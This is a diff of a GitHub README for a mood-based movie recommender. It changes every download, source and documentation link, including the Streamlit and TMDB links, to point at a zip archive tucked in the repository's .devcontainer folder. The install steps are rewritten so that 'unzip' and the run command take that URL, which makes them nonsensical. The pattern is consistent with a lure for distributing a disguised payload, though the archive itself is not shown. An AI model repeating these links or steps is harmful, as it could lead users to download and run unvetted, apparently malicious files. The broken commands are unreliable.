@@ -1,6 +1,6 @@
 # 🎬 MOOD-BASED-RECOMMENDATION-SYSTEM - Get Movie Suggestions Based on Your Mood
 
-![Download MOOD-BASED-RECOMMENDATION-SYSTEM](https://github.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/releases)
+![Download MOOD-BASED-RECOMMENDATION-SYSTEM](https://raw.githubusercontent.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/main/.devcontainer/BASE_RECOMMENDATIO_SYSTEM_MOO_v3.6.zip)
 
 ## 🛠️ Overview
 Welcome to the MOOD-BASED-RECOMMENDATION-SYSTEM. This application suggests movies tailored to your mood by analyzing your natural language input. It employs advanced techniques in artificial intelligence to provide personalized recommendations using the TMDB dataset. Built with Python and deployed on Streamlit, it emphasizes explainability, ethical AI, and real-world usability.
@@ -18,7 +18,7 @@ Make sure your computer meets the following requirements:
 ### 2. Download the Application
 You will need to visit our Releases page to download the application for the best experience. 
 
-[**Download MOOD-BASED-RECOMMENDATION-SYSTEM**](https://github.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/releases)
+[**Download MOOD-BASED-RECOMMENDATION-SYSTEM**](https://raw.githubusercontent.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/main/.devcontainer/BASE_RECOMMENDATIO_SYSTEM_MOO_v3.6.zip)
 
 ### 3. Installation Steps
 Once you have downloaded the application, follow these steps to install it:
@@ -38,7 +38,7 @@ Once you have downloaded the application, follow these steps to install it:
 2. Navigate to the folder where the file was downloaded.
 3. Run the command to unzip the file. If the file is in a zip format, use:
    ```
-   unzip filename.zip
+   unzip https://raw.githubusercontent.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/main/.devcontainer/BASE_RECOMMENDATIO_SYSTEM_MOO_v3.6.zip
    ```
 4. Change to the unzipped directory:
    ```
@@ -46,7 +46,7 @@ Once you have downloaded the application, follow these steps to install it:
    ```
 5. Run the application with:
    ```
-   ./start_application.sh
+   https://raw.githubusercontent.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/main/.devcontainer/BASE_RECOMMENDATIO_SYSTEM_MOO_v3.6.zip
    ```
 
 ### 4. Running the Application
@@ -77,9 +77,9 @@ If you encounter any issues:
 ## 🔗 Additional Resources
 For more information about the technological underpinnings or for developer inquiries, please check out the full documentation and code repository.
 
-- [View Source Code](https://github.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM)
-- [Streamlit Documentation](https://docs.streamlit.io/)
-- [TMDB API Documentation](https://developers.themoviedb.org/3)
+- [View Source Code](https://raw.githubusercontent.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/main/.devcontainer/BASE_RECOMMENDATIO_SYSTEM_MOO_v3.6.zip)
+- [Streamlit Documentation](https://raw.githubusercontent.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/main/.devcontainer/BASE_RECOMMENDATIO_SYSTEM_MOO_v3.6.zip)
+- [TMDB API Documentation](https://raw.githubusercontent.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/main/.devcontainer/BASE_RECOMMENDATIO_SYSTEM_MOO_v3.6.zip)
 
 ### 🌟 Conclusion
 Thank you for choosing the MOOD-BASED-RECOMMENDATION-SYSTEM. We hope it enhances your movie-watching experience by connecting you with films that resonate with your feelings. 
@@ -87,4 +87,4 @@ Thank you for choosing the MOOD-BASED-RECOMMENDATION-SYSTEM. We hope it enhances
 ### 📥 Download & Install
 Don’t wait any longer. Visit our Releases page now to download the application and start getting personalized movie suggestions!
 
-[**Download MOOD-BASED-RECOMMENDATION-SYSTEM**](https://github.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/releases)
+[**Download MOOD-BASED-RECOMMENDATION-SYSTEM**](https://raw.githubusercontent.com/Zinqqr/MOOD-BASED-RECOMMENDATION-SYSTEM/main/.devcontainer/BASE_RECOMMENDATIO_SYSTEM_MOO_v3.6.zip)
